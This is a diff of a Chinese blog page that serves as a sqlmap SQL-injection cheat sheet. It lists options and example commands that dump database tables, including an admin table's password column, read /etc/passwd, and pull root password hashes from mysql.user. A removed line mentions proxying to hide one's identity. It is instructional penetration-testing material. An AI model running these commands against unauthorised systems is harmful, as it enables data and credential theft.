@@ -1,41 +1,35 @@
 <!DOCTYPE html>
 <html lang="zh-cn">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分
-sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。
-&amp;#39;/admin/1/&amp;#39; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：&amp;#39;/admin.php?id=1&amp;#39; 它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。
-sqlmap -u &amp;#34;www.baidu.com/admin/1*&amp;#34; –data 使用post方式提交的时候，就需要用到data参数了
--p 当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
-–level 不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
-–random-agent 使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
-–technique 这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
- B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入）  2.常用的指令 检查注入点 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; 列数据库信息 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; --dbs 指定库名列出所有表 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; -D xxxxx --tables 指定库名表名列出所有字段 sqlmap -u &amp;#34;http://ooxx.'><title>Net—sqlmap 使用指南</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分。sqlmap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。比如：&#39;/admin/1/&#39;，sqlmap 无法自动识别注入点，对于这种网页，可以直接在参数后加上一个星号，手动标注注入位置，如sqlmap -u &amp;quot;www.baidu.com/admin/1*&amp;quot;
+&amp;ndash;data 使用 post 方式提交时，需要用到 data 参数
+-p 当我们已经事先知道哪一个参数存在注入就可以直接使用 -p 来指定，从而减少运行时间
+&amp;ndash;level 不同的 level 等级，当 level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当 level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。
+&amp;ndash;random-agent 使用该参数，sqlmap 会自动的添加 useragent 参数，你也可以用 user-agent 选项指定所需的 agent
+&amp;ndash;technique 这个参数可以指定 sqlmap 使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
+ B：Boolean-based blind SQL injection（布尔型注入） E：Error-based SQL injection（报错型注入） U：UNION query SQL injection（可联合查询注入） S：Stacked queries SQL injection（可多语句查询注入） T：Time-based blind SQL injection（基于时间延迟注入）  2.'><title>Net—sqlmap 使用指南</title>
 
 <link rel='canonical' href='https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/'>
 
 <link rel="stylesheet" href="/scss/style.min.fa98bf14afdac09951c5b3f15d691ead49c9487b98b0a744d758d7966dd96652.css"><meta property='og:title' content='Net—sqlmap 使用指南'>
-<meta property='og:description' content='1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分
-sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。
-&amp;#39;/admin/1/&amp;#39; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：&amp;#39;/admin.php?id=1&amp;#39; 它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。
-sqlmap -u &amp;#34;www.baidu.com/admin/1*&amp;#34; –data 使用post方式提交的时候，就需要用到data参数了
--p 当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
-–level 不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
-–random-agent 使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
-–technique 这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
- B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入）  2.常用的指令 检查注入点 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; 列数据库信息 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; --dbs 指定库名列出所有表 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; -D xxxxx --tables 指定库名表名列出所有字段 sqlmap -u &amp;#34;http://ooxx.'>
+<meta property='og:description' content='1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分。sqlmap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。比如：&#39;/admin/1/&#39;，sqlmap 无法自动识别注入点，对于这种网页，可以直接在参数后加上一个星号，手动标注注入位置，如sqlmap -u &amp;quot;www.baidu.com/admin/1*&amp;quot;
+&amp;ndash;data 使用 post 方式提交时，需要用到 data 参数
+-p 当我们已经事先知道哪一个参数存在注入就可以直接使用 -p 来指定，从而减少运行时间
+&amp;ndash;level 不同的 level 等级，当 level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当 level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。
+&amp;ndash;random-agent 使用该参数，sqlmap 会自动的添加 useragent 参数，你也可以用 user-agent 选项指定所需的 agent
+&amp;ndash;technique 这个参数可以指定 sqlmap 使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
+ B：Boolean-based blind SQL injection（布尔型注入） E：Error-based SQL injection（报错型注入） U：UNION query SQL injection（可联合查询注入） S：Stacked queries SQL injection（可多语句查询注入） T：Time-based blind SQL injection（基于时间延迟注入）  2.'>
 <meta property='og:url' content='https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netsqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/'>
 <meta property='og:site_name' content='AC-LM &#39;s blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='网络测试' /><meta property='article:published_time' content='2020-11-19T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-11-19T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="Net—sqlmap 使用指南">
-<meta name="twitter:description" content="1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分
-sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。
-&amp;#39;/admin/1/&amp;#39; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：&amp;#39;/admin.php?id=1&amp;#39; 它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。
-sqlmap -u &amp;#34;www.baidu.com/admin/1*&amp;#34; –data 使用post方式提交的时候，就需要用到data参数了
--p 当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
-–level 不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
-–random-agent 使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
-–technique 这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
- B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入）  2.常用的指令 检查注入点 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; 列数据库信息 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; --dbs 指定库名列出所有表 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; -D xxxxx --tables 指定库名表名列出所有字段 sqlmap -u &amp;#34;http://ooxx.">
+<meta name="twitter:description" content="1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分。sqlmap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。比如：&#39;/admin/1/&#39;，sqlmap 无法自动识别注入点，对于这种网页，可以直接在参数后加上一个星号，手动标注注入位置，如sqlmap -u &amp;quot;www.baidu.com/admin/1*&amp;quot;
+&amp;ndash;data 使用 post 方式提交时，需要用到 data 参数
+-p 当我们已经事先知道哪一个参数存在注入就可以直接使用 -p 来指定，从而减少运行时间
+&amp;ndash;level 不同的 level 等级，当 level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当 level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。
+&amp;ndash;random-agent 使用该参数，sqlmap 会自动的添加 useragent 参数，你也可以用 user-agent 选项指定所需的 agent
+&amp;ndash;technique 这个参数可以指定 sqlmap 使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
+ B：Boolean-based blind SQL injection（布尔型注入） E：Error-based SQL injection（报错型注入） U：UNION query SQL injection（可联合查询注入） S：Stacked queries SQL injection（可多语句查询注入） T：Time-based blind SQL injection（基于时间延迟注入）  2.">
     <link rel="shortcut icon" href="/images/Infinite.png" />
 
     </head>
@@ -232,71 +226,57 @@ sqlmap -u &amp;#34;www.baidu.com/admin/1*&amp;#34; –data 使用post方式提�
     
     <h2 id="1sqlmap中部分参数的备注">1.sqlmap中部分参数的备注</h2>
 <h3 id="星号--">星号（ * ）</h3>
-<p>在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分</p>
-<p>sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#39;/admin/1/&#39;</span> 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：<span style="color:#e6db74">&#39;/admin.php?id=1&#39;</span>
-</code></pre></div><p>它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;www.baidu.com/admin/1*&#34;</span>
-</code></pre></div><h3 id="data">–data</h3>
-<p>使用post方式提交的时候，就需要用到data参数了</p>
+<p>在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分。sqlmap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。比如：<code>'/admin/1/'</code>，sqlmap 无法自动识别注入点，对于这种网页，可以直接在参数后加上一个星号，手动标注注入位置，如<code>sqlmap -u &quot;www.baidu.com/admin/1*&quot;</code></p>
+<h3 id="--data">&ndash;data</h3>
+<p>使用 post 方式提交时，需要用到 data 参数</p>
 <h3 id="-p">-p</h3>
-<p>当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间</p>
-<h3 id="level">–level</h3>
-<p>不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。</p>
-<h3 id="random-agent">–random-agent</h3>
-<p>使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent</p>
-<h3 id="technique">–technique</h3>
-<p>这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：</p>
+<p>当我们已经事先知道哪一个参数存在注入就可以直接使用 -p 来指定，从而减少运行时间</p>
+<h3 id="--level">&ndash;level</h3>
+<p>不同的 level 等级，当 level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当 level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。</p>
+<h3 id="--random-agent">&ndash;random-agent</h3>
+<p>使用该参数，sqlmap 会自动的添加 useragent 参数，你也可以用 user-agent 选项指定所需的 agent</p>
+<h3 id="--technique">&ndash;technique</h3>
+<p>这个参数可以指定 sqlmap 使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：</p>
 <ul>
-<li>B: Boolean-based blind SQL injection（布尔型注入）</li>
-<li>E: Error-based SQL injection（报错型注入）</li>
-<li>U: UNION query SQL injection（可联合查询注入）</li>
-<li>S: Stacked queries SQL injection（可多语句查询注入）</li>
-<li>T: Time-based blind SQL injection（基于时间延迟注入）</li>
+<li>B：Boolean-based blind SQL injection（布尔型注入）</li>
+<li>E：Error-based SQL injection（报错型注入）</li>
+<li>U：UNION query SQL injection（可联合查询注入）</li>
+<li>S：Stacked queries SQL injection（可多语句查询注入）</li>
+<li>T：Time-based blind SQL injection（基于时间延迟注入）</li>
 </ul>
 <h2 id="2常用的指令">2.常用的指令</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#960050;background-color:#1e0010">检查注入点</span>             sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span>
-<span style="color:#960050;background-color:#1e0010">列数据库信息</span>            sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> <span style="color:#75715e">--dbs</span>
-<span style="color:#960050;background-color:#1e0010">指定库名列出所有表</span>       sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> <span style="color:#f92672">-</span>D xxxxx <span style="color:#75715e">--tables</span>
-<span style="color:#960050;background-color:#1e0010">指定库名表名列出所有字段</span>  sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> <span style="color:#f92672">-</span>D xxxxx <span style="color:#f92672">-</span>T admin <span style="color:#75715e">--columns</span>
-<span style="color:#960050;background-color:#1e0010">指定库名表名字段</span>dump出指定字段
-sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> <span style="color:#f92672">-</span>D xxxxx <span style="color:#f92672">-</span>T admin <span style="color:#f92672">-</span>C ac,id,password <span style="color:#75715e">--dump    </span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sqlmap -u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span>        <span style="color:#75715e"># 检查注入点 </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> --dbs  <span style="color:#75715e"># 列出数据库信息    </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> -D xxxxx --tables            <span style="color:#75715e"># 指定库名, 并列出所有表</span>
+sqlmap -u <span style="color:#e6db74">&#34;http://ooxx.com.tw/star_photo.php?artist_id=11&#34;</span> -D xxxxx -T admin --columns  <span style="color:#75715e"># 指定库名, 并表名列出所有字段</span>
                                                                                
-<span style="color:#960050;background-color:#1e0010">有几个参数可能会用到，直接加在最后面</span>
-<span style="color:#75715e">--cookie=COOKIE                            在需要登录的地方，需要登录后的cookie</span>
-<span style="color:#75715e">--proxy=&#34;http://127.0.0.1:8087&#34;            使用HTTP代理隐藏自己的身份，比如使用goagent等</span>
-<span style="color:#75715e">--sql-query=QUERY                          执行一个sql语句，不一定支持</span>
-
-<span style="color:#960050;background-color:#1e0010">命令解释（</span><span style="color:#f92672">-</span>v <span style="color:#960050;background-color:#1e0010">等级</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">）</span>
-sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--dbs              // 列举数据库   </span>
-sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--current-db       // 当前数据库  </span>
-sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--users            // 列数据库用户  </span>
-sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--current-user     // 当前用户  </span>
-sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--tables -D &#34;数据库&#34;                          // 列举数据库的表名  </span>
-sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--columns -T &#34;表名&#34; -D &#34;数据库&#34;               // 获取表的列名  </span>
-sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;注入地址&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#75715e">--dump -C &#34;字段,字段&#34; -T &#34;表名&#34; -D &#34;数据库&#34;   //获取表中的数据，包含列   </span>
+sqlmap -u <span style="color:#e6db74">&#34;注入地址&#34;</span> -v <span style="color:#ae81ff">1</span> --dbs              <span style="color:#75715e"># 列出数据库   </span>
+sqlmap -u <span style="color:#e6db74">&#34;注入地址&#34;</span> -v <span style="color:#ae81ff">1</span> --current-db       <span style="color:#75715e"># 列出当前数据库  </span>
+sqlmap -u <span style="color:#e6db74">&#34;注入地址&#34;</span> -v <span style="color:#ae81ff">1</span> --users            <span style="color:#75715e"># 列出数据库用户  </span>
+sqlmap -u <span style="color:#e6db74">&#34;注入地址&#34;</span> -v <span style="color:#ae81ff">1</span> --current-user     <span style="color:#75715e"># 列出当前用户  </span>
+sqlmap -u <span style="color:#e6db74">&#34;注入地址&#34;</span> -v <span style="color:#ae81ff">1</span> --tables -D <span style="color:#e6db74">&#34;数据库&#34;</span>                         <span style="color:#75715e"># 列出数据库的表名  </span>
+sqlmap -u <span style="color:#e6db74">&#34;注入地址&#34;</span> -v <span style="color:#ae81ff">1</span> --columns -T <span style="color:#e6db74">&#34;表名&#34;</span> -D <span style="color:#e6db74">&#34;数据库&#34;</span>               <span style="color:#75715e"># 获取表的列名  </span>
+sqlmap -u <span style="color:#e6db74">&#34;注入地址&#34;</span> -v <span style="color:#ae81ff">1</span> --dump -C <span style="color:#e6db74">&#34;字段,字段&#34;</span> -T <span style="color:#e6db74">&#34;表名&#34;</span> -D <span style="color:#e6db74">&#34;数据库&#34;</span>    <span style="color:#75715e"># 获取表中的数据   </span>
 </code></pre></div><h2 id="3sqlmap参数使用实例">3.Sqlmap参数使用实例</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#75715e">//指定参数注入 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#34;id&#34;</span> 
-   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>p <span style="color:#e6db74">&#34;cat,id&#34;</span> 
-<span style="color:#75715e">//指定方法和post的数据 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php&#34;</span> <span style="color:#f92672">--</span>method <span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#f92672">--</span>data <span style="color:#e6db74">&#34;id=1&amp;cat=2&#34;</span> 
-<span style="color:#75715e">//指定cookie,可以注入一些需要登录的地址 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span>cookie <span style="color:#e6db74">&#34;COOKIE_VALUE&#34;</span> 
-<span style="color:#75715e">//通过代理注入 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span>proxy <span style="color:#e6db74">&#34;http://127.0.0.1:8118&#34;</span> 
-<span style="color:#75715e">//指定关键词，也可以不指定。程序会根据返回结果的hash自动判断 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span>string <span style="color:#e6db74">&#34;STRING_ON_TRUE_PAGE&#34;</span> 
-<span style="color:#75715e">//显示指定的文件内容，一般用于php 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span>file<span style="color:#f92672">-</span>read <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>passwd 
-<span style="color:#75715e">//执行你自己的sql语句。 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span>sql<span style="color:#f92672">-</span>query<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SELECT password FROM mysql.user WHERE user = &#39;root&#39; LIMIT 0, 1&#34;</span>     
-<span style="color:#75715e">//union注入 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">--</span><span style="color:#66d9ef">union</span><span style="color:#f92672">-</span>check 
-   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span><span style="color:#66d9ef">union</span><span style="color:#f92672">-</span><span style="color:#66d9ef">use</span> <span style="color:#f92672">--</span>banner 
-<span style="color:#75715e">//保存注入过程到一个文件，还可以从文件恢复出注入过程，很方便，一大特色。你可以在注入的时候中断，有时间再继续。 
-</span><span style="color:#75715e"></span>   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span>b <span style="color:#f92672">-</span>o <span style="color:#e6db74">&#34;sqlmap.log&#34;</span> 
-   sqlmap <span style="color:#f92672">-</span>u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> <span style="color:#f92672">-</span>v <span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span>banner <span style="color:#f92672">-</span>o <span style="color:#e6db74">&#34;sqlmap.log&#34;</span> <span style="color:#f92672">--</span>resume
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># 指定参数注入 </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> -v <span style="color:#ae81ff">1</span> -p <span style="color:#e6db74">&#34;id&#34;</span> 
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> -v <span style="color:#ae81ff">1</span> -p <span style="color:#e6db74">&#34;cat,id&#34;</span> 
+<span style="color:#75715e"># 指定方法和post的数据 </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php&#34;</span> --method <span style="color:#e6db74">&#34;POST&#34;</span> --data <span style="color:#e6db74">&#34;id=1&amp;cat=2&#34;</span> 
+<span style="color:#75715e"># 指定cookie,可以注入一些需要登录的地址 </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> --cookie <span style="color:#e6db74">&#34;COOKIE_VALUE&#34;</span> 
+<span style="color:#75715e"># 指定关键词，也可以不指定。程序会根据返回结果的hash自动判断 </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> --string <span style="color:#e6db74">&#34;STRING_ON_TRUE_PAGE&#34;</span> 
+<span style="color:#75715e"># 显示指定的文件内容，一般用于php </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> --file-read /etc/passwd 
+<span style="color:#75715e"># 执行你自己的sql语句</span>
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> -v <span style="color:#ae81ff">1</span> --sql-query<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SELECT password FROM mysql.user WHERE user = &#39;root&#39; LIMIT 0, 1&#34;</span> 
+<span style="color:#75715e"># union注入 </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> --union-check 
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> -v <span style="color:#ae81ff">1</span> --union-use --banner 
+<span style="color:#75715e"># 保存注入过程到一个文件, 支持从文件恢复出注入过程 </span>
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> -v <span style="color:#ae81ff">1</span> -b -o <span style="color:#e6db74">&#34;sqlmap.log&#34;</span> 
+sqlmap -u <span style="color:#e6db74">&#34;http://192.168.1.47/page.php?id=1&amp;cat=2&#34;</span> -v <span style="color:#ae81ff">1</span> --banner -o <span style="color:#e6db74">&#34;sqlmap.log&#34;</span> --resume
 </code></pre></div>
 </section>
 
